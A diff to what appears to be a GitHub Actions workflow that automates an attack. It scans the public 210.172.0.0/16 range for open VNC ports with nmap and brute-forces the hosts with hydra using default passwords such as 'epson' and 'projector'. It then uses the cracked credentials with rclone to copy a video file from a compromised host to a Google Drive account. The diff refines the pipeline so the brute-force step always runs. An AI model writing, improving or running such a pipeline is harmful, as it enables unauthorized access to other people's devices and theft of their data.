@@ -10,26 +10,28 @@ jobs:
         run: |
           sudo apt-get update -y
           sudo apt-get install -y nmap hydra rclone p7zip-full
-      - name: Scan VNC
-        id: scan
+
+      - name: Scan for open VNC
         run: |
           nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
-          echo "vnc_count=$(wc -l < vnc_hosts.txt)" >> $GITHUB_OUTPUT
-      - name: Brute passwords
-        if: steps.scan.outputs.vnc_count != '0'
+
+      - name: Brute VNC passwords (always runs)
         run: |
           printf 'epson\nadmin\nprojector\n123456\n' > ~/pwd.txt
+          touch valid_ips.txt
           while read ip; do
             hydra -P ~/pwd.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
             [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
           done < vnc_hosts.txt
-      - name: Stream 1080p to Google Drive
+
+      - name: Download & stream 1080p (only if IPs exist)
         run: |
+          [ ! -s valid_ips.txt ] && echo "No valid IPs" && exit 0
           ip=$(head -n1 valid_ips.txt)
           pass=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
-          [ -z "$ip" ] && exit 0
+          [ -z "$pass" ] && echo "Empty password" && exit 0
 
-          # 1. create rclone.conf with Google token
+          # Google Drive config
           mkdir -p ~/.config/rclone
           cat > ~/.config/rclone/rclone.conf <<'EOF'
           [gdrive]
@@ -43,7 +45,6 @@ jobs:
           pass = $(rclone obscure "$pass")
           EOF
 
-          # 2. stream
           rclone copy "relay:/DSIC_P1/VIDEO/DSIC_P1_1080p.mov" \
                       "gdrive:Movies/DSIC_P1_1080p.mov" \
                       --transfers=8 -P
